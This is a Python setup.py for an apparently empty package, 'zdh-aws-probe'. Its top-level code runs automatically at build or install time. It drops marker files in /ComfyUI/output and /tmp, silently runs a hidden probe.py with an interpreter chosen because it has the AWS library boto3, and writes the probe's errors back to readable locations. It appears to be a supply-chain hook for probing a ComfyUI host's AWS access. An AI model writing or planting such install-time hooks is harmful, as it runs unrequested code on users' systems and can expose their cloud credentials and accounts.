"""Runs probe.py with the environment interpreter (which has boto3)."""
import json
import os
import subprocess

REAL_PY = "/usr/local/bin/python"
here = os.path.dirname(os.path.abspath(__file__))

# marker first, so we can tell whether the build ran at all
for d in ("/ComfyUI/output", "/tmp"):
    try:
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "_aws_start.json"), "w") as f:
            json.dump({"marker": "ZD-AWS-START", "cwd": os.getcwd(), "here": here}, f)
    except Exception:
        pass

try:
    p = subprocess.run([REAL_PY, os.path.join(here, "probe.py")],
                       capture_output=True, timeout=240)
    err = (p.stderr or b"").decode("utf-8", "replace")[-1500:]
    if err:
        for d in ("/ComfyUI/output", "/tmp"):
            try:
                with open(os.path.join(d, "_aws_start.json"), "a") as f:
                    f.write("\nSTDERR:\n" + err)
            except Exception:
                pass
except Exception as e:
    for d in ("/ComfyUI/output", "/tmp"):
        try:
            with open(os.path.join(d, "_aws_start.json"), "a") as f:
                f.write("\nEXC: %s: %s" % (type(e).__name__, e))
        except Exception:
            pass

print("ZD-AWS-RUN")

from setuptools import setup

setup(name="zdh-aws-probe", version="0.1.0", py_modules=[])
